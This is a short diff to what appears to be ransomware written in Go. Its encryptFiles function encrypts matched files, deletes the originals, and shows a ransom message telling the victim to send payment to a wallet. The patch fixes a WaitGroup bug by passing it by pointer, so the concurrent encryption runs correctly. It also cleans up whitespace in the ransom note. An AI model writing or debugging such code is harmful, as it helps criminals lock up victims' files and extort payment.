@@ -109,7 +109,7 @@ func encryptFiles() {
 	for _, file := range MatchedFiles {
 		log.Printf("Encrypting %s...\n", file.Path)
 
-		go func(file File, wg sync.WaitGroup) {
+		go func(file File, wg *sync.WaitGroup) {
 			defer wg.Done()
 
 			// Read the file content
@@ -138,7 +138,7 @@ func encryptFiles() {
 			if err != nil {
 				log.Println("Cannot delete original file, skipping...")
 			}
-		}(file, wg)
+		}(file, &wg)
 	}
 
 	go func() {
@@ -154,7 +154,7 @@ func encryptFiles() {
 
 		YOUR IDENTIFICATION IS %s
 
-		PLEASE SEND %s TO THE FOLLOWING WALLET 
+		PLEASE SEND %s TO THE FOLLOWING WALLET
 
 			    %s
 
